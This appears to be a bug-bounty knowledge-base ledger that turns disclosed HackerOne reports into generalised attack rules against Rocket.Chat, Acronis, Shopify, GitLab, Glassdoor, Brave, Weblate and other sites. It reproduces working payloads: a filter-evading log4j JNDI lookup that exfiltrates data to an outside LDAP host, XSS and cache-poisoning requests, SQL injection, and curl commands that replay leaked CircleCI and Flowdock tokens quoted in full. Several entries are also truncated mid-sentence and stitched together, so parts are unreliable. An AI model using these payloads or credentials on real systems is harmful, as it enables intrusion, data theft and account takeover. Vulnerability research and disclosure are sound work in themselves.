### §17.345 — the real-time RPC plane is a second authorization surface (Rocket.Chat DDP)

Rocket.Chat's DDP method `autoTranslate.translateMessage` "accepts a client-supplied `IMessage`
object and passes it directly to `translateMessage()` without checking `Meteor.userId()` or
verifying room membership", so "any authenticated DDP user can read the content of any message by ID
from any room (private channels, DMs, E2EE rooms)". The discovery method is the transferable part:
"the parallel REST endpoint was fixed with `canAccessRoomAsync` but the DDP method was missed."
Transport (standard Meteor DDP, protocol context — the report quotes no frame): WebSocket at
`/websocket` (or SockJS at `/sockjs/`), frame
`{"msg":"method","id":"<n>","method":"autoTranslate.translateMessage","params":[{...IMessage, incl. target _id...}]}`.
Test: enumerate `Meteor.server.method_handlers` and replay every object/id-taking method with a
victim id and no room context. Rule: **a fix applied to the REST route does not reach the DDP method
with the same name — call the sibling directly with a foreign object id and no room context.**

### §17.346 — `${jndi:` is a filter target, not a requirement (log4j lookup injection)

Unauthenticated `GET https://forum.acronis.com/search?s=${j${main:\k5:-Nd}i${spring:k5:-:}ldap://${sys:user.name}-<canary>/`
— the literal token `jndi:` never appears; it is split across NESTED `${...}` substitutions with
default-value syntax, so a keyword filter matching `${jndi:` sees nothing. log4j's own substitution
engine assembles the lookup at render time and makes an outbound LDAP/DNS call that exfiltrated
`sys:user.name` = `solr` to the reporter's canary. Impact: "Remote OS command injection via JNDI
queries." Test: plant the nested-substitution canary in EVERY unauthenticated logged field (search
param, `User-Agent`, `Referer`, `X-Forwarded-For`, `X-Forwarded-Host`) and let the DNS callback name
the injectable field; then serve a malicious LDAP/RMI reference. Freshness caveat: 2021 report —
live only against unmaintained log4j 2.x < 2.17.0 (forums, plugins, appliances).

## Batch 110 — 2026-11-10 (6 sources, 1 appended, 0 §17 slots)

SOURCE: https://hackerone.com/reports/858915 — Shopify, "CircleCI token in github repo allows for
access to sensitive build information", weakness Information Disclosure, reporter `dwimmerlaik`,
submitted 2020-04-24, disclosed 2020-09-15, asset *.shopify.com. `visibility: full`, 4,620-char body
read IN FULL on the live `.json` route. STATUS: UNVERIFIED (not reproduced).

CLASS: sensitive information disclosure WITH PoC -> authenticated access to an INTERNAL third-party
CI/CD service (build metadata, artifacts, SSH checkout/deploy keys, integrated-service env vars) plus
build control — a CI/CD provider API token committed to a PUBLIC version-control repo.

CORE METHOD (verbatim from the report):
  1. "While looking through some Shopify Github repos I came across the following CircleCI token:
     `ca84774a88598f639b174d498c219163e04adbb2` in the `js-buy-sdk` repo."
  2. Validate: `curl https://circleci.com/api/v1.1/me?circle-token=<token>` — "returns information
     about the user which confirms the token is valid." The token is the SOLE credential, passed as
     the `circle-token=` query param or the `Circle-Token` header.
  3. Artifacts: `curl -H'Circle-Token: <token>'
     https://circleci.com/api/v1.1/project/github/Shopify/js-buy-sdk/1200/artifacts` -> a JSON array of
     `{path, pretty_path, node_index, url}`; fetch each `url` (a `*.circle-artifacts.com` CDN host)
     with the same header.
  4. SSH keys: `curl
     https://circleci.com/api/v1.1/project/github/<org>/<repo>/checkout-key?circle-token=<token>` ->
     `[{public_key: "ssh-rsa AAAAB3...", type: "github-user-key", fingerprint, login, preferred}]`.
  5. Integrated-service secrets from build info: `"flowdock_api_token" : "7e6b75e2335d035c192c338b390ee9e5"`.
  6. Write scope (documented, not exercised): "running or cancelling builds; viewing information
     about past builds; creating and deleting keys, and accessing build artifacts or environment
     variables."

DETECTION SIGNAL: a PUBLIC repo containing a CI/CD provider token (`circle-token=`, `Circle-Token`,
`CIRCLE_TOKEN`, `circleci.com/api`; also Travis/GitLab/Jenkins runner tokens); a token that returns
a user from the provider's identity endpoint; artifact URLs on `*.circle-artifacts.com`; a
`checkout-key` response carrying `github-user-key` + a `login`.

CHAIN: anonymous attacker (the token is in a PUBLIC repo) -> replay it against the CI provider's API
as the sole credential -> read build metadata, artifact paths + CDN URLs, SSH checkout/deploy keys,
integrated-service env vars -> use the token's WRITE scope to run/cancel builds and create/delete
keys (build-pipeline control + credential theft). Preconditions = a VALID provider token in a
publicly readable repo; gain = build secrets, deploy keys, build control.

TRANSFERABLE TEST: for every CI/CD provider token found in a public repo, (1) validate against the
provider's identity endpoint (`GET /api/v1.1/me?circle-token=<t>`), (2) enumerate
project/build/artifacts, (3) pull `checkout-key`, (4) read integrated-service keys from build info,
(5) confirm the WRITE scope from the provider's API docs and exercise it only on a build you own.
Rule: **a CI provider token is a bearer credential for the provider's WHOLE API — `circle-token=`
or `Circle-Token` is the only auth, so a token committed to a public repo hands over build artifacts,
deploy keys, environment variables and build control.** Same general method as #761791 (TestRail) =>
NO new §17 slot. FRESHNESS CAVEAT: 2020 report; CircleCI has deprecated API v1.1 — re-verify the
provider's current API version on a live target.

## Batch 111 — 2026-11-10 (6 sources, 2 appended, 2 §17 slots)

SOURCE: https://hackerone.com/reports/423797 — Chaturbate, "Passive stored XSS at broadcast room",
weakness XSS - Stored, High 8.9 (PR:L/UI:R/S:C/C:H/I:H), reporter `skavans`, submitted 2018-10-14,
disclosed 2018-11-06. `visibility: no-content`, `vulnerability_information` 0 B; technique read from
the researcher's own `summaries[1].content` (2,790 B — the full writeup) on the live `.json` route.
STATUS: UNVERIFIED (not reproduced).

CLASS: stored XSS via DELIMITER INJECTION into a pipe-serialized metadata field that is rendered into
an `<a href>` — the delimiter is not escaped in the value, so the value can terminate one field and
start another; the payload-length cap is bypassed by splitting the payload across TWO injection points
chained through a global variable and `eval` of attacker-controlled DOM text.

CORE METHOD (verbatim from the report):
  1. Sink: "JS function `start_defchat` contains object with many different parameters and the
     interesting one is `app_info_json` ... format: `APP1_NAME|APP1_DETAILS_LINK,APP2_NAME|APP2_DETAILS_LINK`
     ... used to construct the chat header"; rendered DOM `<p>You are running these apps:
     <a href="javascript:alert()" target="_blank">1</a></p>`.
  2. Bypass: "the `|` symbol is unfiltered so an attacker can craft application with malicious name
     containing this symbol to forge the app link to the javascript protocol one"; injected value
     `something|javascript:alert()|APP1_DETAILS_LINK,APP2_NAME|APP2_DETAILS_LINK`.
  3. Length-cap bypass: "the app name length is limited to 32 symbols ... It can be bypassed if the
     attacker puts the JS-code in some other HTML-element under his control and then just reads and
     executes it from the evil link ... So I have split the payload into two and used two
     applications" — app 1 name `1|javascript:b='#roomtitle';0`, app 2 name
     `2|javascript:eval($(b).text())`, room title `alert('XSS by skavans at ' + document.domain)`.
  4. Steps: set the room title, register the two apps, broadcast, victim clicks link 1 then link 2.
     Impact, verbatim: "Get full control under victim's account." Scope limit, verbatim: "does not
     work at the latest Firefox because of `target="_blank"` link's attribute."

DETECTION SIGNAL: a string SERIALIZED with a delimiter (`|`, `,`, `;`, `:`) then SPLIT and interpolated
into an HTML attribute (`href`, `src`, `action`, `formaction`); a value field whose delimiter is not
escaped; a hard length cap on the value; a second attacker-controlled DOM element whose TEXT can be
read with `eval($(x).text())`; a chat/broadcast header rendering a list of running apps/integrations.
CHAIN: broadcaster (primitive: owns the room title + app names) -> app name carries the unescaped `|`
so `app_info_json` forges `href="javascript:..."` (primitive: delimiter unfiltered, sink interpolates
split parts into an attribute) -> 32-char cap forces a two-stage payload: link 1 writes a global
(`b='#roomtitle'`), link 2 `eval($(b).text())` reads the attacker-set room title (escalation:
length-cap bypass via global + DOM-text eval) -> victim clicks both links -> stored XSS in the
victim's session -> "Get full control under victim's account" (High 8.9).
TRANSFERABLE TEST: for every delimiter-serialized field rendered into an attribute, submit a value
containing the raw delimiter (`APP|javascript:alert(1)|x`) and diff the rendered HTML for a forged
attribute; when a length cap exists, split the payload across TWO injection points — the first writes
a global from an attacker-controlled DOM element, the second evals it — and click both.
Rule: **a delimiter inside a serialized value is a field separator, not data; a length cap is beaten
by storing state in a global and eval'ing attacker-controlled DOM text from a second injection point.**
DEDUPE: 0 hits across all three targets for `423797`, `app_info_json`, `start_defchat`, `roomtitle`,
`|javascript`, `pipe-delimited`; the two `chaturbate` hits are the unrelated #394329 billing-ATO
report. Related-but-distinct: §17.207 (parameter NAME is the sink), §17.262 (`javascript:` in a
redirect param), §17.231 (SVG sanitizer), §17.252 (cache-key delimiter), §17.115 (env-file
delimiter), and the ledger's "split the payload across two stored records" (~5159/~22010 — a CSP
bypass, not a length-cap bypass). -> §17.347.

SOURCE: https://hackerone.com/reports/3799010 — Nextcloud, "TaskProcessing callback authorization
bypass allows ex-members to post as Assistant Talk Bot", weakness IDOR, Medium 4.3
(PR:L/UI:N/S:U/C:N/I:L), reporter `kuninogu`, submitted 2026-06-12, disclosed 2026-08-14, fixed in
Assistant Talk Bot 3.3.0. `visibility: no-content`, `vulnerability_information` 0 B; technique read
from the team's `summaries[0].content` (424 B) on the live `.json` route, plus the public
@hackeronereports summary for the root-cause sentence. STATUS: UNVERIFIED (not reproduced).

CLASS: IDOR / broken access control on a SERVICE-BOT CALLBACK endpoint — the callback accepts a
caller-supplied conversation token and acts with the bot's TRUSTED identity without verifying that
the callback belongs to a task the bot originally scheduled, nor that the caller is still a
participant.

CORE METHOD (verbatim):
  1. "An authenticated user could inject messages into Talk conversations they no longer had access
     to by scheduling a text processing task with a callback targeting the Assistant Talk Bot."
  2. "The bot did not verify that the user still had access to the target conversation before posting
     messages under its trusted identity."
  3. Root cause: "the Talk Bot's endpoint trusting the caller-supplied conversation token without
     verifying that the callback belonged to a task originally scheduled by the bot."
  4. Fix: "limiting bot replies to active conversation participants only."

DETECTION SIGNAL: a background/async task API (TaskProcessing, AI assistants, webhooks, job callbacks)
taking a caller-supplied TARGET id (conversation token, room id) plus a callback; a bot/service
identity posting into a conversation; a callback route that authorizes the CALLER but never binds the
callback to the scheduling task; a participation check present on the user-facing post route but
absent on the bot/callback route; a fix note "limit bot replies to active conversation participants".
CHAIN: any authenticated low-privilege user -> schedule a text-processing task with a callback
targeting the Assistant Talk Bot and a conversation token for a room they are about to leave ->
leave / be removed -> the callback still fires and the bot posts attacker-guided content into that
room under its TRUSTED identity (escalation: callback never bound to the scheduled task, no
participation re-check) -> inject messages into conversations the attacker can no longer reach
(Medium 4.3, integrity low).
TRANSFERABLE TEST: on any app with a background/AI task taking a callback/webhook plus a
caller-supplied target id, schedule it while you are a member of the target conversation, then REMOVE
yourself before it runs; if the callback still posts under the bot/service identity, the callback is
unbound and the participation check is missing. Rule: **a bot/callback endpoint that trusts a
caller-supplied target identifier and acts with a trusted service identity is a second authorization
surface — bind the callback to the task that scheduled it and re-check the caller's membership first.**
DEDUPE: 0 hits across all three targets for `3799010`, `TaskProcessing`, `Assistant Talk`, `Talk Bot`,
`conversation token`, `callback belonged`; the single `trusted identity` hit is the Mail.ru `X-Pid`
header IDOR (§17.25). Related-but-distinct: the GitLab project-template export entry (ledger
~2657-2667 step 5 — async job with no re-authorization, but a DATA-EXPORT read with no service
identity, vs. this WRITE under a TRUSTED BOT identity via an unbound callback); §17.339, §17.297,
§17.221 are different primitives. -> §17.348.

### §17.349 — the authorization check is often in the view layer, not the object layer
(FetLife, HackerOne #1424291, medium 6.5)

`/users/{user-id}/pictures/{pic-id}` "has 2 types of responses, HTML and JSON. The type of response
depends on `Accept` header"; "When this endpoint returns JSON response, it does not check if
requester is authorized to access requested resource." PoC, verbatim:
`curl https://fetlife.com/users/14104003/pictures/120041856 -H "Cookie: _fl_sessionid={your-session}"
-H "Accept: application/json" --user-agent "not cur1"` — same shape for a private video and post.
Test: replay any private-resource request with `Accept: application/json` (then `.json`, `?_format=`)
using a non-owner session; a 200 with the full record where the HTML path 403s = the ACL is bound
to the representation. Rule: **the authorization check is often implemented in the view/template
layer, not the object layer — toggle the representation on a private resource and the ACL disappears.**
Related-but-distinct: §17.313 (#724944) is the same family but weaker — there the caller CAN read
the record in HTML and `.json` leaks hidden internal FIELDS; here the caller CANNOT read the object
at all and the JSON branch returns the ENTIRE object with no check.

### §17.350 — a state endpoint keyed only by ids the caller holds, whose `status` is the
counterparty's decision, is a forgeable state machine (+ a client-supplied price the server never
re-derives is a fare bypass) (inDrive, HackerOne #1960107, high 8.1)

`/api/setTenderStatus?...&tender_id=<T>&order_id=<O>&status=accept` — "Here the orderID and tenderID
is from step 1" (the rider's own `/api/driverrequest` bid response); "The ride gets accepted."
Impact, verbatim: "The rider can get details of any passenger, this includes phone number of
passengers. Even when the passenger doesn't accept the riders offer." The fare bypass: "The rider
can modify the price range to be of a much higher value than that" (`price=63` in the bid request);
team summary: "allowed the driver to set the ride price by force bypassing the built-in ride price
calculation algorithm". Test: harvest the ids from your own bid response, then (a) call the state
endpoint with the COUNTERPARTY's decision value (`status=accept`) and no ownership field; (b) diff
your `price` against the fare the server quoted; (c) read the counterparty's PII. Rule: **a state
endpoint keyed only by ids the caller already holds, whose `status` value is the counterparty's
decision, is a forgeable state machine — and a client-supplied price the server never re-derives is
a fare bypass; combine them to force-accept an inflated ride.** Related-but-distinct: §17.311
(#1785079) records the READ side (`getTenderStatus`); this is the WRITE side (`setTenderStatus`).

### §17.351 — a rich-text/attachment field value is rendered as HTML in the client, and a `<`
filter that only strips non-leading `<` is a positional bypass (Rocket.Chat, HackerOne #219957,
critical 9.9)

`chat.postMessage` with `attachments[0][image_url]=/assets/logo` and
`attachments[0][fields][0][value]=<img src=/assets/logo width=1 height=1 onload=alert('XSS4') />...`
— verbatim: "When the attachment has an `image_url` assigned, the first field's value can be used to
inject HTML tags ... `<` must be the leading character of the field's value property." Impact,
verbatim: "An attacker can craft a custom message using the REST API that, once seen by the observer,
executes arbitrary code in the context of the client user." Test: post an attachment whose value
STARTS with `<img ... onerror=...>` and whose `image_url` is set; open the channel as a second user;
repeat with the `<` moved off position 0 to confirm the positional filter. Rule: **a rich-text/
attachment field value is rendered as HTML in the client — start the value with `<` and set the
attachment's image URL so it renders.** Freshness caveat: 2017 report — the exact Rocket.Chat
renderer is long changed; the transferable part is the positional-`<` filter and the
attachment-field sink.

### §17.352 — HTML-entity encoding is an HTML-context encoder; inside a `<script>` block it is not decoded, so `\uXXXX` JS escapes pass straight through (Acronis, HackerOne #979204, low)

The reflected `back` parameter on `https://partners.acronis.com/en-us/profile/login.html` is
HTML-entity-encoded, but the value is interpolated into a `<script>` block (`var back = "..."`)
where HTML entities are NOT decoded (script is raw text). The reporter's rule, verbatim: "For
this payload `\"><img src=x onerror=alert(1)><x y=\"` we have to replace `\"` with `\\u0022`,
`>` with `\\u003e` and `<` with `\\u003c`." The working URL, verbatim:
`https://partners.acronis.com/en-us/profile/login.html?-back=\\u0022\\u003e\\u003cimg+src=x+onerror=alert(1)\\u003e\\u003cx+y=\\u0022`
(the report's markdown doubles the backslash; the JS parser decodes the single-backslash
`\u0022`). Impact, verbatim: "This XSS is in the login page so it can be used to get someone's
credentials.." Test: for every reflected value that is HTML-entity-encoded, replay the payload
with `"`→`\u0022`, `>`→`\u003e`, `<`→`\u003c` and check whether it fires. Rule: **HTML-entity
encoding is an HTML-context encoder — inside a `<script>` block it is not decoded, so `\uXXXX`
JS escapes pass straight through the encoder and are decoded by the JS parser.** Freshness
caveat: 2020 report — the exact Acronis login page is long changed; the transferable part is the
encoder-mismatch test.

### §17.353 — a client-side `maxlength` is a DOM property, not a server-side validation; raise it in the browser and the SQLi payload reaches the server (U.S. DoD, HackerOne #419017, high)

The SSN field on `https://██████████/████/candidate_app/status_scholarship.aspx` is capped only
by `maxlength="9"` in the HTML. The reporter's steps, verbatim: "Right click on the SSN field,
click Inspect Element, and edit `maxlength="9"` by changing it to `maxlength="9999"`" then
"Enter in your SQL injection payload into the SSN field. For example, try `' OR '1'='1`." The
error-based confirmation on the sibling DOB field, verbatim: "a payload that will cause invalid
syntax like `'`. It will give you an HTTP 500 response. If you do a payload that won't cause
invalid syntax like `''`, it will give you an HTTP 200." Impact, verbatim: "control the content
in the database, exfiltrate information, and potentially obtain remote code execution." Test:
on any field capped only by `maxlength`, edit the attribute in the DOM and resubmit the payload
that was rejected; run the `'`→500 / `''`→200 differential on that field and its siblings. Rule:
**a client-side `maxlength` is a DOM property, not a server-side validation — raise it in the
browser and the payload reaches the server; confirm error-based SQLi with the `'`→500 /
`''`→200 status differential.** Freshness caveat: 2018 report — the transferable part is the
delivery bypass and the error-based differential.

### §17.354 — a template that substitutes page-controlled metadata into HTML unescaped AND that
contains a LITERAL placeholder for the CSP nonce is a nonce-injection sink: write the placeholder
into the metadata and the app's own substitution fills in the real nonce (Brave iOS, HackerOne
#1436142, critical 9.5)

SOURCE: https://hackerone.com/reports/1436142 — Brave Software, "New XSS vector in ReaderMode with
%READER-TITLE-NONCE%" (Cross-site Scripting (XSS) - Generic; reporter `nishimunea`; submitted
2021-12-26, disclosed 2023-06-22; asset SOURCE_CODE https://github.com/brave/brave-ios;
`visibility: full`, body read IN FULL this pass on the live `.json` route; UNVERIFIED — not
reproduced).

The ReaderMode HTML template carries two literal tokens: `%READER-TITLE-NONCE%` (the CSP nonce) and
`%READER-CREDITS%` (the byline). The report, verbatim: "The `%READER-CREDITS%` is replaced with
the value of the `<meta name=\"author\">` tag in the original page, but then the HTML tags are not
escaped." And: "when the following meta tag is embedded in the original page and the page is
displayed in ReaderMode, this Swift code replaces `%READER-TITLE-NONCE%` with the correct nonce
value." The payload, verbatim: `<meta name=\"author\" content=\"Evil &lt;script
nonce=%READER-TITLE-NONCE%&gt;alert(document.location);&lt;/script&gt;!--\">`. So the attacker
writes the LITERAL placeholder into page-controlled metadata; the app's own substitution later
replaces it with the real nonce, and the injected `<script>` therefore satisfies the CSP. The
script runs on `http://localhost:6571/reader-mode?uri={uri}&uuidkey={value}` — a privileged local
origin hosting every readeralized page. Impact, verbatim: "any cross-origin pages, that has been
converted to ReaderMode, can be stolen by embedding an iframe and reading out them. Also ...
the `uuidkey` is included in the URL query string. By obtaining this key, the attacker can gain
access to Brave's privileged pages."

Test: on any app that re-renders third-party content in a privileged origin under a nonce-based
CSP, grep the app source / rendered template for placeholder tokens (`%...%`, `{{...}}`,
`__...__`) whose name contains NONCE, and for a token substituted from page-controlled metadata;
then plant metadata (meta author/title/byline/credits) containing
`<script nonce=<LITERAL-PLACEHOLDER>>alert(1)</script>` and let the app's own substitution fill in
the real nonce. Rule: **when a template substitutes page-controlled metadata into HTML unescaped
AND the template contains a literal placeholder for the CSP nonce, write the placeholder into the
metadata — the app itself replaces it with the real nonce, so the injected script satisfies the
CSP.** Freshness caveat: 2021 report, Brave iOS only — the transferable part is the
placeholder-as-nonce injection, which recurs wherever a reader/proxy/AMP mode builds HTML from
third-party metadata under a nonce CSP.

### #1656380 — a one-time promotion OFFER id is not invalidated when the state it authorizes is
revoked, so replaying the accept mutation re-applies the revoked role (Reddit, medium 5.0)

SOURCE: https://hackerone.com/reports/1656380 — Reddit, "Reddit talk promotion offers don't
expire, allowing users to accept them after being demoted" (Insecure Direct Object Reference
(IDOR); reporter `ahacker1`; submitted 2022-08-01, disclosed 2022-10-03; asset www.reddit.com;
`visibility: full`, body read IN FULL this pass on the live `.json` route; UNVERIFIED — not
reproduced). Recorded in the harvest ledger and here; NO §17 slot — the unburned-one-time-offer-id
method is §17.87 (Stripe #1849626), and this is the sibling defect where the token is not
invalidated on a STATE REVOCATION rather than stacked.

The report, verbatim: "When promoting a user to a speaker/host, an offerId is created which can be
accepted by the user. However, after accepting them the offerIds don't expire. This means that
after the user is demoted back to a listener, they can still use the offerIds to go back to their
previous promoted role." The accept request, verbatim: "The request should be to
https://gql.reddit.com The body should be similar to
`{\"variables\":{\"platformUserId\":\"PLATFORM_USER_ID\",\"offerId\":\"UUID_OFFER_ID\"},\"id\":\"475c91dd4480\"}`".
The replay, verbatim: "As UserA demote UserB to listener. (Click UserB's avatar and click Move to
Audience) / As UserB repeat/re-send the request used in step 5. Notice that you will be promoted
back to speaker/host. / This works even after you are demoted again." Impact, verbatim: "This
allows speakers/hosts of a talk to re-become a speaker/host at any time after being demoted. This
could lead to interruptions to the reddit talk."

Test: for any one-time role/invite/promotion/grant token, capture the ACCEPT request
(persisted-op id + variables, or REST body) at grant time; then REVOKE the state it authorized
(demote, cancel, revoke, expire, logout, close the object); then re-send the identical accept
request. If the state re-applies, the token was never bound to the state. Rule: **a one-time
authorization token must be invalidated when the state it authorizes is revoked — capture the
accept mutation at grant time, revoke the state, then replay; if the state re-applies, the token's
lifetime is not bound to the state.**

1. #2257080 (GitLab, "Stored-XSS injected in Wiki page via Banzai pipeline", XSS - Stored, High 8.7,
   reporter `yvvdwf`, submitted 2023-11-19, disclosed 2024-05-28, patched in GitLab 16.10.1) —
   THREE-STAGE BANZAI PIPELINE INJECTION. Route: `.json` body read IN FULL (24,577 B). Verbatim
   atoms: (a) the `gsub` PREFIX/FULL mismatch — `link_pattern_start = /\A#{link_pattern}/` checks
   "only the prefix", then `link_pattern` is used in `gsub` to replace ANY occurrence, so the
   second replacement "will expanse the corresponding information into `alt` attribute. This
   information will never be redacted as it tag `<a>` does not have `class = gfm`"; (b) the
   SANITIZER-SCOPE bypass — "Any users' direct input of `href` is sanitized but not the `href`
   which are generated by other HTML filters. One of them is GollumTagsFilter", so
   `UNSAFE_LIBXML_ESCAPE_CHARS = { ' ' => '%20', '"' => '%22' }` never touches the generated href
   and `[[a|http:'\"&lt;]]` emits `href="http:'&quot;&lt;"`; (c) the HTML4/HTML5 mXSS — "The backend
   parses HTML by using Nokogiri with HTML4 format. HTML4 accepts only space characters between
   tag name and the attribute. However the browser supports HTML5 which tolerate some additional
   characters, such as `/`", so `<img/src="0"onerror="alert(0)">` is `<img>` at the backend and
   `<img src="0" onerror="alert(0)">` at the browser; wrap it as
   `<svg><style><img/src="0"onerror="alert(0)"></style></svg>` and the browser "is mutated to get
   outside of `<svg>` context". Final payload verbatim:
   `<i class=gl-show-field-errors><input title="<script>alert(document.domain)</script>"/></i>`.
   Impact verbatim: "Stored-XSS with CSP-bypass allows executing arbitrary javascript at the client
   side on behalf of victims including any RESTfull API." -> §17.357.

2. #1621540 (Glassdoor, "Web Cache Poisoning leads to XSS and DoS", XSS - Stored, reporter
   `nokline` with @bombon, created 2022-07-01, disclosed 2022-09-13, $1,700 per the PentesterLand
   index) — MULTI-CHANNEL PAYLOAD SPLIT + DOT-SEGMENT CACHE POISONING. Route: the `.json` route is

   the CREDITED PUBLIC WRITEUP `https://nokline.github.io/bugbounty/2022/09/02/Glassdoor-Cache-Poisoning.html`
   (Harel Security Research, 2022-09-02). Verbatim atoms: (a) "For any page under the path
   https://www.glassdoor.com/Job/?xss all URL parameters are reflected within a Javascript script
   tag"; (b) the WAF rule — "All I had to do was remove the greater than `>` sign and I got a 200
   ... the WAF did allow whitespace characters such as `%20`"; (c) the SECOND reflection channel —
   "The optimizelyEndUserId cookie value is reflected in the page, right after the URL parameters.
   By combining this with the issue from step 1. we can bypass the WAF by splitting the payload
   into two parts"; (d) the cache rule — `/Job/*` not cached, `/Award/*` cached; (e) the parser
   disagreement — "path traversal characters `/../` ... were being normalized by the caching
   frontend server but not being normalized by the backend web application (Dissagreement of RFC
   3986 5.2.4)"; (f) the poison request verbatim:
   `GET /Job/../Award/RANDOMPATHTATDOESNOTEXIST?cachebuster=046&attack=VULN%3C/script%20` with
   `Cookie: optimizelyEndUserId=BRUH><svg/onload=a=self['aler'%2B't']%3Ba(document.domain)>` — the
   `>` that closes `</script` arrives from the COOKIE; (g) the header-only variant
   `https://glassdoor.com/mz-survey/interview/collectQuestions_input.htm/../../../Award/blah`.
   -> §17.358.

3. #2194928 (U.S. Dept Of Defense, "Full account takeover of any user through reset password",

   — the challenge question AND its answer travel in the SAME request; steps "1-request for forget

SOURCE: https://hackerone.com/reports/271324  2026-11-10
ROUTE: live `.json` route -> HTTP 200, 10,067 B, `visibility: full`, `vulnerability_information` 2,293 B read IN FULL (`curl` + desktop UA); the report is also indexed by `web_search`. Metadata: HackerOne (team `security`), "Homograph fix Bypass", weakness Violation of Secure Design Principles, severity Medium 4.2, submitted 2017-09-24, disclosed 2017-10-16, state Closed, reporter `hk755a` (verified).
STATUS: UNVERIFIED (not reproduced — no hackerone.com redirect was touched this pass; the URLs and the reported behaviour are verbatim from the report body).
CLASS: signed-redirect validation bypass by CANONICALIZATION MISMATCH — the signature is computed over the NORMALIZED (punycode) form of the `url` parameter, so re-submitting the SAME destination in a different ENCODING passes the signature while the redirect target differs from the value the warning interstitial displays (CWE-349 / CWE-601).
CORE METHOD:
  1. THE CONTROL, verbatim: `https://hackerone.com/redirect?signature=829727b4188c43dcf394fd841fd19a8b7f391bd1&url=https%3A%2F%2Fwww.yelp.com%2F` — "Got the above link generated by posting \"https://www.yelp.com/\" on Hackerone Platform". Changing even one character in the `url` parameter invalidates the link: "If I change even a single character in the URL parameter above the link gets Invalid. We get \"Something went wrong\" Response."
  2. THE IDN CASE, verbatim: posting `https://www.уelp.com/` (Cyrillic `у`) generates `url=https%3A%2F%2Fwww.xn--elp-cfd.com%2F` — "Here \"уelp.com\" is actually an IDN and its punycode version is \"xn--elp-cfd.com\" & that's why it automatically got converted by Hackerone to its punycode representation in the above URL".
  3. THE BYPASS, verbatim: "Now lets replace \"xn--elp-cfd.com\" to the original IDN i.e \"уelp.com\" in the above URL. As Infered from CASE 1, Upon changing any character in the URL parameter, Ideally we should get an error and the link should become invalid. But,that is not the case here when we are dealing with IDN Links. The link is still valid even after changing value of the URL parameter-From Punycode version to IDN." — the changed URL is `https://hackerone.com/redirect?signature=e021a53caee6e288347ad14e95648ba6d8fb53cb&url=https%3A%2F%2Fwww.%D1%83elp.com%2F`.
  4. THE SECOND BYPASS, verbatim: "IF we Add extra \"//\" after \"https:%3A%2F%2F\" in the above url we get the following URL: `https://hackerone.com/redirect?signature=e021a53caee6e288347ad14e95648ba6d8fb53cb&url=https%3A%2F%2F//www.%D1%83elp.com%2F`. ***You can see that the above link displays \"https:///www.yelp.com/\" but actually redirects us to \"https://www.xn--elp-cfd.com/\" ***"
  5. THE IMPACT, verbatim: "And thus the current fix for Homograph attack seems to be bypassed. Mobile phone users are more likely to be affected by the above vulnerability."
DETECTION SIGNAL: a redirect endpoint whose `url`/`next`/`returnTo` parameter carries a SIGNATURE/HMAC and whose only protection is a signed allow-list; a link whose signature validates for two DIFFERENT encodings of the same destination (punycode vs raw IDN/Unicode, an extra `//` after the scheme, case, trailing dot, percent-encoding variants); a warning interstitial that DISPLAYS one host while the `Location`/navigation goes to another; an IDN/homograph domain anywhere in the chain.
CHAIN: an attacker who can get a victim to click a platform link (primitive: a signed redirect URL generated by posting a URL) -> the signature is computed over the NORMALIZED destination, so the attacker re-submits the same destination as the RAW IDN (and/or with an extra `//`) and the signature STILL validates (escalation: the signature control is defeated) -> the warning interstitial displays a safe-looking/punycode host while the browser navigates to the homograph domain (escalation: the interstitial's displayed value and the actual destination disagree) -> the victim is phished on a lookalike domain reached from a trusted, signature-valid platform link (impact: credential phishing / homograph attack; program rated Medium 4.2). Per doctrine §8: preconditions = the victim clicks the crafted link (the reporter notes mobile users are more likely affected); gain = navigation to an attacker-chosen homograph domain behind a trusted platform link.
TRANSFERABLE TEST: for every signed redirect URL (`/redirect?signature=…&url=…`, `/r?token=…&dest=…`, `/out?u=…&sig=…`), take a generated link and re-submit the SAME destination in a DIFFERENT ENCODING — punycode vs raw IDN/Unicode, an extra `//` after the scheme, case changes, a trailing dot, percent-encoding variants — and check whether the signature STILL validates (the link does not error) while the redirect target / displayed value changes. Rule: **a signature computed over the NORMALIZED form of a URL is defeated by re-submitting the same destination in a different encoding — the signature check and the redirect use two different parses of the same string.**
DEDUPE: 0 hits for `271324`, `hk755a`, `homograph fix`, `xn--elp-cfd`, `redirect?signature`. Pre-existing material REVIEWED as related-but-distinct: the ledger's HMAC-over-concatenated-parameters entry (§17.229 / Bugbountyskills.md:20868) is about AMBIGUOUS CONCATENATION (no separator/length prefix), not a canonicalization mismatch over one URL parameter; §17.250/§17.252 record the general "validation and resolution disagree" principle (IDNA/punycode named as one atom) but not the signed-redirect carrier or the extra-`//` display/target split; the PentesterLand index's "IDN Homograph Attack" line points to a DIFFERENT Medium article (password reset), not this report. No new §17 slot (the canonicalization-mismatch class is owned by §17.250/§17.252; this is the signed-redirect + homograph-interstitial delta).
FRESHNESS CAVEAT: submitted 2017-09-24, disclosed 2017-10-16 — well outside the 6-12-month window; admitted because it was opened and read this pass and the carrier (a signed redirect whose signature is computed over the punycode-normalized URL, defeated by the raw IDN + extra `//`) is absent from the ledger. The exact endpoint is HackerOne's own and long changed; the transferable part is the signature-canonicalization test.

SOURCE: https://hackerone.com/reports/3869124  2026-11-10
ROUTE: live `.json` route -> HTTP 200, 16,622 B, `visibility: full`, `vulnerability_information` 2,400 B read IN FULL (`curl` + desktop UA). Metadata: Weblate, "**Unauthenticated IDOR allows modification of payment customer billing information**", weakness Insecure Direct Object Reference (IDOR), severity High 7.5, submitted 2026-07-16, disclosed 2026-08-30, state Closed, reporter `visionx7` (verified). The report uses `http://127.0.0.1:8000` as the host in its repro.
STATUS: UNVERIFIED (not reproduced — no Weblate instance was touched this pass; the endpoint, the UUID and the field values are verbatim from the report body).
CLASS: unauthenticated IDOR / broken access control on a payment-record WRITE endpoint keyed only by the object UUID in the URL (CWE-639 / CWE-306).
CORE METHOD:
  1. CREATE a payment object and note its UUID — the report's example: `01f82084-20dc-498a-b004-2694d51be433`.
  2. OPEN the edit page UNAUTHENTICATED (a browser where you are not logged in): `http://127.0.0.1:8000/en/payment/01f82084-20dc-498a-b004-2694d51be433/edit/` — the server returns the payment billing-information edit page with no login and no ownership check ("Observe that the payment billing information edit page is accessible without authentication").
  3. MODIFY the billing fields — the report's values: `Name: IDOR_EVIDENCE_TEST`, `Address: IDOR_ADDRESS_TEST`.
  4. SUBMIT the form; "The application accepts the request and updates the customer billing information."
  5. VERIFY the change persisted by re-reading the customer record — "The modified values remain saved: Name: IDOR_EVIDENCE_TEST / Address: IDOR_ADDRESS_TEST".
